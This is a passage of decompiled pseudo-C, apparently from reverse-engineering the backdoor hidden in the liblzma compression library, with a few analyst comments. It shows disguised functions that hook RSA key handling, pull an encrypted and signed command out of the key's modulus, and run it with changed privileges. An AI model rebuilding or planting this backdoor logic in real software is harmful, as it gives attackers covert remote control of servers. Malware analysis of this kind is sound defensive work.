      if (*(char *)(puVar7 + 1) == '\0') {
        puVar4 = (uint *)((long)puVar7 + 5);
        uVar5 = uVar5 - 1;
      }
      *param_1 = puVar4;
      *param_3 = (ulong)uVar5;
      return 1;
    }
  }
  return 0;
}



undefined  [16]
_Lbt_skip_func_part_0(undefined8 param_1,undefined8 param_2,ulong param_3,undefined8 param_4)

{
  long lVar1;
  long lVar2;
  code *pcVar3;
  undefined auVar4 [16];
  long lVar5;
  undefined8 uVar6;
  undefined auVar7 [16];
  
  if (global_ctx == 0) {
    auVar4._8_8_ = 0;
    auVar4._0_8_ = param_3;
    return auVar4 << 0x40;
  }
  lVar1 = *(long *)(global_ctx + 0x10);
  if ((lVar1 != 0) && (lVar2 = *(long *)(global_ctx + 0x20), lVar2 != 0)) {
    if (*(short *)(lVar2 + 0x84) != 0) {
      if (*(long *)(lVar2 + 0x88) != 0) {
        lVar5 = FUN_00107110();
        if (-1 < lVar5) {
          **(undefined8 **)(lVar2 + 0xa0) = *(undefined8 *)(lVar2 + 0xd8);
          uVar6 = 1;
          goto LAB_00108113;
        }
      }
    }
    pcVar3 = *(code **)(lVar1 + 0x18);
    if (pcVar3 != (code *)0x0) {
      (*pcVar3)(0);
    }
  }
  uVar6 = 0;
LAB_00108113:
  auVar7._8_8_ = param_4;
  auVar7._0_8_ = uVar6;
  return auVar7;
}



undefined8 _Llzma_code_part_1(long param_1,undefined4 param_2,long param_3)

{
  long lVar1;
  code *pcVar2;
  undefined8 uVar3;
  uint uVar4;
  uint *puVar5;
  uint local_15;
  uint uStack_11;
  undefined uStack_d;
  undefined4 uStack_c;
  
  local_15 = 0;
  lVar1 = *(long *)(global_ctx + 0x20);
  uStack_11 = 0;
  uStack_d = 0;
  uStack_c = 0;
  if (((byte)(param_3 == 0 | (byte)((uint)param_2 >> 0x1f)) == 0) && (param_1 != 0)) {
    uVar4 = (uint)*(ushort *)(lVar1 + 0x90);
    if ((*(ushort *)(lVar1 + 0x90) == 0) ||
       (puVar5 = *(uint **)(lVar1 + 0x98), puVar5 == (uint *)0x0)) {
      puVar5 = &local_15;
      uStack_d = 1;
      uStack_11 = *(uint *)(lVar1 + 0x40) & 0xff;
      local_15 = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      uVar4 = (local_15 >> 0x18) + 4;
    }
    FUN_00107110(param_2,puVar5,uVar4);
    **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
    uVar3 = 1;
  }
  else {
    if ((*(long *)(global_ctx + 0x10) != 0) &&
       (pcVar2 = *(code **)(*(long *)(global_ctx + 0x10) + 0x18), pcVar2 != (code *)0x0)) {
      (*pcVar2)(0);
    }
    uVar3 = 0;
  }
  return uVar3;
}



bool _Lparse_lzma12_0(long param_1,long param_2)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  undefined4 auStack_b8 [8];
  undefined local_98 [16];
  undefined4 local_88 [8];
  undefined local_68 [80];
  
  if (param_1 == 0) {
    return false;
  }
  if ((param_2 != 0) && (*(long *)(param_2 + 8) != 0)) {
    puVar3 = auStack_b8;
    for (lVar2 = 0xc; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    puVar3 = local_88;
    for (lVar2 = 0x1c; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    iVar1 = FUN_001071b0(auStack_b8,0x30,auStack_b8,local_98,local_88);
    if (iVar1 != 0) {
      iVar1 = FUN_001071b0(param_2 + 0x108,0x39,local_88,local_68,param_1,
                           *(undefined8 *)(param_2 + 8));
      return iVar1 != 0;
    }
  }
  return false;
}



undefined8 installed_func_0(RSA *rsa,long ctx)

{
  char cVar1;
  char cVar2;
  long **pplVar3;
  code *pcVar4;
  undefined auVar5 [16];
  undefined auVar6 [16];
  int iVar7;
  bool bVar8;
  int iVar9;
  int iVar10;
  uint uVar11;
  byte *pbVar12;
  undefined7 extraout_var;
  ulong **ppuVar13;
  int *piVar14;
  long lVar15;
  undefined8 uVar16;
  long lVar17;
  long lVar18;
  undefined extraout_DL;
  byte bVar19;
  undefined4 *puVar20;
  ulong uVar21;
  undefined4 *puVar22;
  undefined4 *puVar23;
  undefined8 *puVar24;
  undefined4 *puVar25;
  undefined *puVar26;
  RSA_METHOD *pRVar27;
  ENGINE *pEVar28;
  ulong uVar29;
  ulong **ppuVar30;
  long lVar31;
  byte bVar32;
  long **pplVar33;
  undefined local_e81;
  int local_e80;
  int local_e7c;
  ulong local_e78;
  ENGINE *local_e70;
  RSA_METHOD *local_e68;
  undefined local_e60 [16];
  undefined local_e50 [16];
  undefined local_e40 [16];
  undefined4 local_e30 [57];
  undefined local_d4a;
  undefined local_d41;
  undefined local_d40 [16];
  undefined4 local_d30 [60];
  undefined8 local_c40;
  undefined8 local_c38;
  undefined4 local_c30;
  undefined4 local_c2c;
  ulong local_c28 [33];
  undefined local_b20 [5];
  undefined auStack_b1b [11];
  undefined local_b10;
  uint uStack_b0f;
  undefined4 uStack_b0b;
  undefined4 uStack_b07;
  uint uStack_b03;
  undefined4 uStack_aff;
  undefined4 uStack_afb;
  undefined4 uStack_af7;
  undefined4 uStack_af3;
  undefined4 uStack_aef;
  undefined4 local_aeb;
  undefined4 local_ac7;
  undefined local_ac3;
  undefined local_ac1;
  undefined4 local_ac0;
  undefined4 local_abb [66];
  undefined4 local_9b3;
  uint local_98b;
  undefined4 local_987;
  undefined4 local_983;
  undefined4 uStack_97f;
  undefined local_920 [16];
  undefined4 local_910;
  undefined local_90b [399];
  undefined4 local_77c [467];
  long n_nbits;
  BIGNUM *p_n;
  ulong *p_n_bits;
  
  bVar32 = 0;
  local_920 = ZEXT816(0);
  puVar23 = &local_910;
  for (lVar17 = 0x236; lVar17 != 0; lVar17 = lVar17 + -1) {
    *puVar23 = 0;
    puVar23 = puVar23 + 1;
  }
  local_e80 = -1;
  if (rsa == (RSA *)0x0) {
    return 0;
  }
  pRVar27 = rsa->meth;
  if (pRVar27 == (RSA_METHOD *)0x0) {
    return 0;
  }
  pEVar28 = rsa->engine;
  if (pEVar28 == (ENGINE *)0x0) {
    return 0;
  }
  iVar9 = rsa->pad;
  if ((iVar9 == 3) && ((*(byte *)(rsa->version + 1) & 0x40) == 0)) {
    if (rsa->d == (BIGNUM *)0x0) {
      return 0;
    }
    if (rsa->n == (BIGNUM *)0x0) {
      return 0;
    }
    if (*(short *)&rsa->e != 0x30) {
      return 0;
    }
  }
  if (ctx == 0) {
    return 0;
  }
  lVar17 = *(long *)(ctx + 8);
  if (lVar17 == 0) {
    return 0;
  }
  lVar18 = *(long *)(ctx + 0x10);
  if (lVar18 == 0) {
    return 0;
  }
  if (*(long *)(lVar18 + 0x40) == 0) {
    return 0;
  }
  if (*(long *)(lVar18 + 0x50) == 0) {
    return 0;
  }
  piVar14 = *(int **)(ctx + 0x20);
  if (*piVar14 == 0) {
    if (iVar9 == 0) {
      return 0;
    }
    pbVar12 = (byte *)rsa->version;
    if (iVar9 == 3) {
      if ((pbVar12[2] & 0x20) != 0) {
        return 0;
      }
      uVar11 = 0x16;
      if (*(long *)(piVar14 + 0x16) != 0) {
        uVar11 = *(uint *)(*(long *)(piVar14 + 0x16) + -8);
      }
LAB_0010846c:
      bVar19 = pbVar12[3];
      goto LAB_00108470;
    }
    if (pbVar12 == (byte *)0x0) {
      uVar11 = 0x16;
      if (iVar9 != 1) goto LAB_0010847f;
    }
    else {
      if (iVar9 != 1) {
        if (iVar9 != 2) {
LAB_001083d5:
          uVar11 = 0x16;
          if (*(long *)(piVar14 + 0x16) != 0) {
            uVar11 = *(uint *)(*(long *)(piVar14 + 0x16) + -8);
          }
          goto LAB_00108467;
        }
LAB_0010840f:
        uVar11 = (uint)pbVar12[2];
        if (pbVar12[2] == 0) {
          uVar11 = 0x16;
          if (*(long *)(piVar14 + 0x16) != 0) {
            uVar11 = *(uint *)(*(long *)(piVar14 + 0x16) + -8);
          }
        }
        goto LAB_0010847f;
      }
LAB_001083f7:
      uVar11 = (uint)pbVar12[2];
      if (pbVar12[2] == 0) {
        if (*(long *)(piVar14 + 0x16) == 0) {
          uVar11 = 0x16;
        }
        else {
          uVar11 = *(uint *)(*(long *)(piVar14 + 0x16) + -8);
        }
      }
    }
LAB_0010845f:
    if ((pbVar12[1] & 1) != 0) goto LAB_0010847f;
  }
  else {
    pbVar12 = (byte *)rsa->version;
    if (pbVar12 == (byte *)0x0) {
      uVar11 = 0x16;
      if (iVar9 != 0) {
        if (iVar9 == 1) goto LAB_0010845f;
LAB_00108467:
        if (iVar9 != 3) goto LAB_0010847f;
        goto LAB_0010846c;
      }
    }
    else {
      if (iVar9 == 1) goto LAB_001083f7;
      if (iVar9 == 2) goto LAB_0010840f;
      if (iVar9 != 0) goto LAB_001083d5;
      if ((pbVar12[2] & 0x3f) == 0) {
        if (*(long *)(piVar14 + 0x16) == 0) {
          uVar11 = 0x16;
        }
        else {
          uVar11 = *(uint *)(*(long *)(piVar14 + 0x16) + -8);
        }
      }
      else {
        uVar11 = (uint)(pbVar12[2] & 0x3f) * 2;
      }
    }
    bVar19 = pbVar12[1];
LAB_00108470:
    if ((char)bVar19 < '\0') goto LAB_0010847f;
  }
  **(undefined4 **)(piVar14 + 0x32) = 3;
LAB_0010847f:
  if (((uint)rsa->pad < 2) || (rsa->pad == 3)) {
    if ((*pbVar12 & 0x40) != 0) {
      puVar24 = (undefined8 *)(piVar14 + 0x30);
      if ((undefined4 *)*puVar24 == (undefined4 *)0x0) {
        return 0;
      }
      piVar14 = (int *)0x0;
      *(undefined4 *)*puVar24 = 0;
    }
    if ((rsa->pad == 3) && ((pbVar12[1] & 0xc0) != 0xc0)) {
      if ((pbVar12[1] & 0xc0) == 0x40) {
        if (*(code **)(lVar18 + 0x18) == (code *)0x0) {
          return 0;
        }
        (**(code **)(lVar18 + 0x18))(0,piVar14,uVar11);
        return 0;
      }
      if (*(ushort *)&rsa->e < 0x30) {
        return 0;
      }
                    // Pointer to RSA modulus
      p_n = rsa->n;
                    // Pointer to modulus bits
      p_n_bits = p_n->d;
                    // Number of bit array entries
      n_nbits = *(long *)&p_n->top;
      if (0x3fef < n_nbits - 0x11U) {
        return 0;
      }
      pplVar3 = *(long ***)(lVar18 + 0x68);
      pplVar33 = (long **)register0x00000020;
      do {
        if (pplVar3 <= pplVar33) {
          return 0;
        }
        ppuVar30 = (ulong **)*pplVar33;
        if ((ulong **)0xffffff < ppuVar30) {
          iVar9 = _Lhc_find_func_1(ppuVar30,0x4001 - n_nbits,ctx);
          if (iVar9 != 0) {
            ppuVar13 = (ulong **)((0x4001 - n_nbits) + (long)ppuVar30);
            for (; ppuVar30 < ppuVar13; ppuVar30 = (ulong **)((long)ppuVar30 + 1)) {
              _local_b20 = ZEXT816(0);
              local_b10 = 0;
              uStack_b0f = 0;
              uStack_b0b = SUB164(ZEXT816(0),5);
              uStack_b07 = 0;
              uStack_b03 = uStack_b03 & 0xff000000;
              if ((*ppuVar30 == p_n_bits) &&
                 (iVar9 = FUN_001072d0(ppuVar30,n_nbits,local_b20,0x20,*(undefined8 *)(ctx + 8)),
                 iVar9 != 0)) {
                lVar17 = 0;
                while( true ) {
                  cVar1 = *(char *)((long)&p_n->neg + lVar17);
                  cVar2 = local_b20[lVar17];
                  if ((cVar1 < cVar2) || (cVar2 < cVar1)) break;
                  lVar17 = lVar17 + 1;
                  if (lVar17 == 0x20) {
                    _local_b20 = ZEXT816(0);
                    puVar26 = &local_b10;
                    for (lVar17 = 0x29; lVar17 != 0; lVar17 = lVar17 + -1) {
                      *puVar26 = 0;
                      puVar26 = puVar26 + (ulong)bVar32 * -2 + 1;
                    }
                    iVar9 = _Lparse_lzma12_0(local_b20,ctx);
                    if (iVar9 == 0) {
                      return 0;
                    }
                    uVar21 = n_nbits - 0x10;
                    ppuVar13 = ppuVar30 + 2;
                    iVar9 = FUN_001071b0(ppuVar13,uVar21 & 0xffffffff,local_b20,ppuVar30,ppuVar13,
                                         *(undefined8 *)(ctx + 8));
                    if (iVar9 == 0) {
                      return 0;
                    }
                    goto LAB_00108881;
                  }
                }
              }
            }
          }
        }
        pplVar33 = pplVar33 + 1;
      } while( true );
    }
  }
  puVar23 = *(undefined4 **)(ctx + 0x38);
  local_d40 = ZEXT816(0);
  puVar22 = (undefined4 *)local_b20;
  for (lVar18 = 0x69; lVar18 != 0; lVar18 = lVar18 + -1) {
    *puVar22 = 0;
    puVar22 = puVar22 + 1;
  }
  local_e81 = 1;
  puVar24 = &local_c40;
  for (lVar18 = 0x47; lVar18 != 0; lVar18 = lVar18 + -1) {
    *(undefined4 *)puVar24 = 0;
    puVar24 = (undefined8 *)((long)puVar24 + 4);
  }
  local_e7c = 0;
  puVar22 = local_e30;
  for (lVar18 = 0x3c; lVar18 != 0; lVar18 = lVar18 + -1) {
    *puVar22 = 0;
    puVar22 = puVar22 + 1;
  }
  local_e60 = ZEXT816(0);
  puVar22 = local_d30;
  for (lVar18 = 0x3c; lVar18 != 0; lVar18 = lVar18 + -1) {
    *puVar22 = 0;
    puVar22 = puVar22 + 1;
  }
  puVar22 = (undefined4 *)local_b20;
  local_e50 = ZEXT816(0);
  local_e40 = ZEXT816(0);
  if (((puVar23 != (undefined4 *)0x0) && (*(long *)(ctx + 0x40) != 0)) &&
     (bVar8 = mem_empty((uint64_t *)(lVar17 + 0xd0),9), auVar6 = _local_b20,
     (int)CONCAT71(extraout_var,bVar8) == 0)) {
    ppuVar13 = (ulong **)local_920;
    lVar31 = 0;
    uVar29 = 0;
    local_b20[4] = extraout_DL;
    auStack_b1b._4_7_ = auVar6._9_7_;
    auStack_b1b._0_4_ = 0x2000000;
    ppuVar30 = ppuVar13;
    for (lVar18 = 0x23a; lVar18 != 0; lVar18 = lVar18 + -1) {
      *(undefined4 *)ppuVar30 = 0;
      ppuVar30 = (ulong **)((long)ppuVar30 + (ulong)bVar32 * -8 + 4);
    }
    uStack_b0b = 0x1c000000;
    local_e70 = pEVar28;
    local_e40[0] = 0x80;
    local_e68 = pRVar27;
    uStack_b07 = *puVar23;
    uStack_b03 = puVar23[1];
    uStack_aff = puVar23[2];
    local_aeb = 0x20000000;
    local_d4a = 8;
    local_d41 = 1;
    local_ac7 = 0x3000000;
    local_ac3 = 1;
    local_ac1 = 1;
    local_ac0 = 0x1010000;
    uStack_afb = puVar23[3];
    uStack_af7 = puVar23[4];
    uStack_af3 = puVar23[5];
    uStack_aef = puVar23[6];
    puVar20 = (undefined4 *)local_e40;
    puVar25 = local_abb;
    for (lVar18 = 0x40; lVar18 != 0; lVar18 = lVar18 + -1) {
      *puVar25 = *puVar20;
      puVar20 = puVar20 + (ulong)bVar32 * -2 + 1;
      puVar25 = puVar25 + (ulong)bVar32 * -2 + 1;
    }
    uVar21 = 0x628;
    local_9b3 = 0x1000000;
    local_987 = 0x7000000;
    while( true ) {
      local_e78 = 0;
      iVar9 = FUN_00107340((long)local_77c + uVar29,uVar21,&local_e78,(&local_e70)[lVar31],lVar17);
      if ((iVar9 == 0) || (uVar21 < local_e78)) break;
      uVar29 = uVar29 + local_e78;
      uVar21 = uVar21 - local_e78;
      if (lVar31 != 0) {
        if (0x628 < uVar29) {
          return 0;
        }
        iVar9 = (int)uVar29;
        uVar11 = iVar9 + 0xb;
        local_98b = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                    uVar11 * 0x1000000;
        uVar11 = iVar9 + 0x2a7;
        uStack_b0f = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
        uVar11 = iVar9 + 700;
        local_b20._0_4_ =
             uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
        ;
        lVar17 = *(long *)(ctx + 8);
        ppuVar30 = ppuVar13;
        for (lVar18 = 0x69; lVar18 != 0; lVar18 = lVar18 + -1) {
          *(undefined4 *)ppuVar30 = *puVar22;
          puVar22 = puVar22 + (ulong)bVar32 * -2 + 1;
          ppuVar30 = (ulong **)((long)ppuVar30 + (ulong)bVar32 * -8 + 4);
        }
        lVar17 = (**(code **)(lVar17 + 0xd0))();
        if (lVar17 == 0) {
          return 0;
        }
        puVar26 = &local_e81;
        lVar18 = (**(code **)(*(long *)(ctx + 8) + 0xe0))(puVar26,1,0);
        if (lVar18 != 0) {
          lVar31 = (**(code **)(*(long *)(ctx + 8) + 0xe0))(local_e40,0x100,0);
          lVar15 = (**(code **)(*(long *)(ctx + 8) + 0xe0))(puVar26,1,0);
          iVar9 = (**(code **)(*(long *)(ctx + 8) + 0xe8))(lVar17,lVar31,lVar18,lVar15);
          if (iVar9 != 1) goto LAB_00108cf2;
          pcVar4 = *(code **)(*(long *)(ctx + 8) + 0xf0);
          uVar16 = (**(code **)(*(long *)(ctx + 8) + 0x58))();
          iVar9 = (*pcVar4)(local_90b,uVar29 + 399,local_e60,0,uVar16,0);
          if (iVar9 == 1) {
            iVar9 = (**(code **)(*(long *)(ctx + 8) + 0xf8))
                              (0x2a0,local_e60,0x20,local_d40,&local_e7c,lVar17);
            if ((iVar9 == 1) && (local_e7c == 0x100)) {
              local_c40 = 0xc00000014010000;
              local_c2c = 0x10000;
              local_c38 = **(undefined8 **)(ctx + 0x40);
              local_c30 = *(undefined4 *)(*(undefined8 **)(ctx + 0x40) + 1);
              uVar21 = uVar29 + 0x2c0;
              puVar23 = (undefined4 *)local_d40;
              p_n_bits = local_c28;
              for (lVar18 = 0x40; lVar18 != 0; lVar18 = lVar18 + -1) {
                *(undefined4 *)p_n_bits = *puVar23;
                puVar23 = puVar23 + (ulong)bVar32 * -2 + 1;
                p_n_bits = (ulong *)((long)p_n_bits + (ulong)bVar32 * -8 + 4);
              }
              lVar18 = *(long *)(ctx + 8);
              puVar24 = &local_c40;
              puVar23 = (undefined4 *)((long)local_77c + uVar29);
              for (lVar31 = 0x47; lVar31 != 0; lVar31 = lVar31 + -1) {
                *puVar23 = *(undefined4 *)puVar24;
                puVar24 = (undefined8 *)((long)puVar24 + (ulong)bVar32 * -8 + 4);
                puVar23 = puVar23 + (ulong)bVar32 * -2 + 1;
              }
              (**(code **)(lVar18 + 0x108))(lVar17);
LAB_00108881:
              pbVar12 = (byte *)rsa->version;
              uVar11 = rsa->pad;
              if (pbVar12 == (byte *)0x0) {
                return 0;
              }
              if ((*pbVar12 & 0x20) == 0) {
                iVar9 = installed_func_3(ctx,&local_e80,1,0);
              }
              else {
                if (uVar11 == 2) {
                  bVar19 = pbVar12[1] >> 1;
                }
                else if (uVar11 < 3) {
                  if (uVar11 == 0) {
                    bVar19 = pbVar12[1] >> 3 & 0xf;
                  }
                  else {
                    bVar19 = pbVar12[1] >> 2;
                  }
                }
                else {
                  bVar19 = 1;
                  if (uVar11 == 3) {
                    bVar19 = pbVar12[2] & 0x1f;
                  }
                }
                iVar9 = installed_func_2(&local_e80,bVar19,*(undefined8 *)(ctx + 0x10));
              }
              iVar7 = local_e80;
              if (iVar9 == 0) {
                return 0;
              }
              pbVar12 = (byte *)rsa->version;
              iVar9 = rsa->pad;
              lVar17 = *(long *)(ctx + 0x10);
              puVar24 = &local_c40;
              for (lVar18 = 0x12; lVar18 != 0; lVar18 = lVar18 + -1) {
                *(undefined4 *)puVar24 = 0;
                puVar24 = (undefined8 *)((long)puVar24 + (ulong)bVar32 * -8 + 4);
              }
              if (local_e80 < 0) {
                return 0;
              }
              if (pbVar12 == (byte *)0x0) {
                return 0;
              }
              if (lVar17 == 0) {
                return 0;
              }
              if (*(long *)(lVar17 + 0x18) == 0) {
                return 0;
              }
              if ((iVar9 == 0) || ((iVar9 == 3 && ((pbVar12[2] & 0x20) != 0)))) {
                iVar10 = _Lthreads_stop_0(&local_c40,ctx);
                if (iVar10 == 0) {
                  return 0;
                }
                *(uint *)(ctx + 0x50) = *pbVar12 & 1;
              }
              lVar18 = FUN_00107110(iVar7,ppuVar13,uVar21,lVar17);
              if (lVar18 < 0) {
                return 0;
              }
              if (iVar9 == 0) {
LAB_001089d5:
                auVar6._11_5_ = 0;
                auVar6._0_11_ = auStack_b1b;
                _local_b20 = auVar6 << 0x28;
                uVar21 = local_c28[0];
                if (0x40 < local_c28[0]) {
                  uVar21 = 0x40;
                }
                uVar11 = (int)uVar21 + 1;
                local_b20._0_4_ =
                     uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
                lVar18 = FUN_00107110(iVar7,local_b20,5,lVar17);
                if (lVar18 < 0) {
                  return 0;
                }
                lVar18 = FUN_00107110(iVar7,local_c40,uVar21,lVar17);
                if (lVar18 < 0) {
                  return 0;
                }
                if (iVar9 != 3) goto LAB_0010899e;
              }
              else {
                if (iVar9 != 3) goto LAB_0010899e;
                if ((pbVar12[2] & 0x20) != 0) goto LAB_001089d5;
              }
              if (-1 < (char)*pbVar12) {
                return 1;
              }
LAB_0010899e:
              auVar5._12_4_ = 0;
              auVar5._0_12_ = local_d40._4_12_;
              local_d40 = auVar5 << 0x20;
              lVar18 = FUN_001070a0(iVar7,local_d40,4,lVar17);
              if (lVar18 < 0) {
                return 0;
              }
              uVar11 = (uint)local_d40._0_4_ >> 0x18 | (local_d40._0_4_ & 0xff0000) >> 8 |
                       (local_d40._0_4_ & 0xff00) << 8 | local_d40._0_4_ << 0x18;
              local_d40._0_4_ = uVar11;
              uVar21 = (ulong)uVar11;
              if (uVar21 != 0) {
                if (*(long *)(lVar17 + 0x48) == 0) {
                  return 0;
                }
                if (*(long *)(lVar17 + 0x50) == 0) {
                  return 0;
                }
                do {
                  while( true ) {
                    uVar29 = 0x200;
                    if (uVar21 < 0x201) {
                      uVar29 = uVar21;
                    }
                    lVar18 = (**(code **)(lVar17 + 0x48))(iVar7,local_b20,uVar29);
                    if (-1 < lVar18) break;
                    piVar14 = (int *)(**(code **)(lVar17 + 0x50))();
                    if (*piVar14 != 4) {
                      return 0;
                    }
                  }
                  if (lVar18 == 0) {
                    return 0;
                  }
                  uVar21 = uVar21 - lVar18;
                } while (uVar21 != 0);
              }
              if (iVar9 != 2) {
                return 1;
              }
              if (*(code **)(lVar17 + 0x18) == (code *)0x0) {
                return 0;
              }
              (**(code **)(lVar17 + 0x18))(0);
              return 1;
            }
          }
        }
        lVar31 = 0;
        lVar18 = 0;
        lVar15 = 0;
LAB_00108cf2:
        (**(code **)(*(long *)(ctx + 8) + 0x108))(lVar17);
        if (lVar18 != 0) {
          (**(code **)(*(long *)(ctx + 8) + 0x110))(lVar18);
        }
        if (lVar31 != 0) {
          (**(code **)(*(long *)(ctx + 8) + 0x110))(lVar31);
        }
        if (lVar15 == 0) {
          return 0;
        }
        (**(code **)(*(long *)(ctx + 8) + 0x110))(lVar15);
        return 0;
      }
      lVar31 = 1;
    }
  }
  return 0;
}



undefined8 _Ldecode_buffer_part_0(undefined4 *param_1,ulong param_2,long param_3)

{
  undefined4 *puVar1;
  long lVar2;
  int iVar3;
  ulong uVar4;
  long lVar5;
  ulong uVar6;
  undefined *puVar7;
  int iVar8;
  undefined4 local_81;
  undefined4 uStack_7d;
  undefined4 uStack_79;
  undefined4 uStack_75;
  undefined local_71 [16];
  undefined local_61 [49];
  
  local_71 = ZEXT816(0);
  puVar7 = local_61;
  for (lVar5 = 0x29; lVar5 != 0; lVar5 = lVar5 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  if (param_1 == (undefined4 *)0x0) {
    if (param_3 == 0) {
      return 0;
    }
  }
  else {
    if (param_3 == 0) {
      return 0;
    }
    if (*(uint *)(param_3 + 0x104) == 3) {
      return 1;
    }
    if ((0x12 < param_2) && (*(uint *)(param_3 + 0x104) < 2)) {
      local_81 = *param_1;
      uStack_7d = param_1[1];
      uStack_79 = param_1[2];
      uStack_75 = param_1[3];
      iVar3 = _Lparse_lzma12_0(local_71,param_3);
      if (iVar3 != 0) {
        puVar1 = param_1 + 4;
        iVar8 = (int)param_2 + -0x10;
        iVar3 = FUN_001071b0(puVar1,iVar8,local_71,&local_81,puVar1,*(undefined8 *)(param_3 + 8));
        if (((iVar3 != 0) && (uVar6 = (ulong)*(ushort *)(param_1 + 4), uVar6 <= param_2 - 0x12)) &&
           (lVar5 = *(long *)(param_3 + 0xe8), uVar6 < (ulong)(*(long *)(param_3 + 0xe0) - lVar5)))
        {
          lVar2 = *(long *)(param_3 + 0xf0);
          for (uVar4 = 0; uVar6 != uVar4; uVar4 = uVar4 + 1) {
            *(undefined *)(lVar5 + lVar2 + uVar4) = *(undefined *)((long)param_1 + uVar4 + 0x12);
          }
          *(long *)(param_3 + 0xe8) = *(long *)(param_3 + 0xe8) + uVar6;
          iVar3 = FUN_001071b0(puVar1,iVar8,local_71,&local_81,puVar1,*(undefined8 *)(param_3 + 8));
          if (iVar3 != 0) {
            return 1;
          }
        }
      }
    }
  }
  *(undefined4 *)(param_3 + 0x104) = 0xffffffff;
  return 0;
}



undefined8 _Lfile_info_decode_0(undefined8 param_1,undefined4 param_2,undefined8 param_3)

{
  char cVar1;
  code *UNRECOVERED_JUMPTABLE;
  ulong uVar2;
  code *pcVar3;
  int iVar4;
  long lVar5;
  ulong uVar6;
  long lVar7;
  ulong uVar8;
  undefined8 uVar9;
  long lVar10;
  long lVar11;
  long lVar12;
  long lVar13;
  ulong uVar14;
  undefined8 *puVar15;
  undefined *puVar16;
  ushort *puVar17;
  byte bVar18;
  undefined8 local_140;
  undefined local_131 [16];
  undefined local_121 [41];
  undefined8 local_f8 [3];
  undefined8 local_e0 [6];
  undefined local_aa [16];
  undefined local_9a [106];
  
  lVar7 = global_ctx;
  bVar18 = 0;
  if (global_ctx == 0) {
    return 0;
  }
  lVar11 = *(long *)(global_ctx + 0x10);
  if (lVar11 == 0) {
    return 0;
  }
  lVar12 = *(long *)(global_ctx + 0x20);
  if (lVar12 == 0) {
    return 0;
  }
  if (*(long *)(global_ctx + 0xf0) == 0) {
    return 0;
  }
  UNRECOVERED_JUMPTABLE = *(code **)(lVar12 + 0x48);
  if (UNRECOVERED_JUMPTABLE == (code *)0x0) goto LAB_00109491;
  if (*(int *)(global_ctx + 0x104) == 4) goto LAB_0010946f;
  iVar4 = _Lstream_encoder_mt_init_part_0(global_ctx);
  if (((iVar4 == 0) || (*(int *)(lVar7 + 0x104) == 4)) || (*(int *)(lVar7 + 0x104) == -1))
  goto LAB_00109449;
  puVar15 = local_f8;
  for (lVar10 = 0x12; lVar10 != 0; lVar10 = lVar10 + -1) {
    *(undefined4 *)puVar15 = 0;
    puVar15 = (undefined8 *)((long)puVar15 + (ulong)bVar18 * -8 + 4);
  }
  local_140 = 0;
  iVar4 = _Lstream_decoder_mt_get_progress_0(param_3,lVar7,local_f8,local_e0);
  if ((iVar4 == 0) || (iVar4 = _Lworker_start_0(local_f8,local_e0[0],&local_140,lVar7), iVar4 == 0))
  goto LAB_0010946f;
  _Ldecode_buffer_part_0(local_f8[0],local_140,lVar7);
  iVar4 = *(int *)(lVar7 + 0x104);
  if (iVar4 == 3) {
LAB_00109236:
    puVar17 = *(ushort **)(lVar7 + 0xf8);
    if (puVar17 != (ushort *)0x0) {
      uVar8 = (ulong)*puVar17;
      cVar1 = *(char *)((long)puVar17 + 0x3b);
      uVar14 = uVar8 - 0x120;
      if (cVar1 == '\x02') {
        if ((((*(long *)(*(long *)(lVar7 + 0x20) + 0x78) != 0) && (4 < uVar14)) &&
            (uVar14 = (ulong)puVar17[0x57], puVar17[0x57] != 0)) &&
           ((uVar14 < uVar8 - 0x122 && (uVar8 = (uVar8 - 0x122) - uVar14, 2 < uVar8)))) {
          puVar16 = (undefined *)((long)puVar17 + uVar14 + 0xb0);
          *(undefined *)(lVar12 + 0x84) = *puVar16;
          *(undefined *)(lVar12 + 0x85) = puVar16[1];
          if ((*(ushort *)(lVar12 + 0x84) == 0) || (uVar8 - 2 < (ulong)*(ushort *)(lVar12 + 0x84)))
          {
            *(undefined2 *)(lVar12 + 0x84) = 0;
          }
          else {
            lVar11 = *(long *)(lVar7 + 0x20);
            uVar9 = *(undefined8 *)(lVar7 + 0x10);
            *(ulong *)(lVar12 + 0x88) = (long)puVar17 + uVar14 + 0xb2;
            lVar12 = *(long *)(lVar11 + 0x20);
            if (lVar12 != 0) {
              **(long **)(lVar11 + 0x78) = lVar12;
              lVar7 = FUN_00107110(param_2,puVar17 + 0x58,uVar14,uVar9);
              if (-1 < lVar7) {
                return 0;
              }
              goto LAB_0010946f;
            }
          }
        }
      }
      else if (cVar1 == '\x03') {
        if (((*(long *)(lVar11 + 0x30) != 0) && (8 < uVar14)) &&
           (*(char *)((long)puVar17 + (uVar8 - 0x73)) == '\0')) {
          uVar14 = *(ulong *)(puVar17 + 0x57);
          uVar8 = uVar14 >> 0x20;
          if ((((int)(uVar14 >> 0x20) == 0) ||
              (iVar4 = (**(code **)(lVar11 + 0x20))(uVar8,uVar8,uVar8), iVar4 != -1)) &&
             (((int)uVar14 == 0 ||
              (iVar4 = (**(code **)(lVar11 + 0x28))
                                 (uVar14 & 0xffffffff,uVar14 & 0xffffffff,uVar14 & 0xffffffff),
              iVar4 != -1)))) {
            (**(code **)(lVar11 + 0x30))(puVar17 + 0x5b);
            *(undefined4 *)(lVar7 + 0x104) = 4;
            goto LAB_0010946f;
          }
        }
      }
      else if (((cVar1 == '\x01') && (*(long *)(*(long *)(lVar7 + 0x20) + 0x38) != 0)) &&
              (1 < uVar14)) {
        *(undefined *)(lVar12 + 0x90) = *(undefined *)(puVar17 + 0x57);
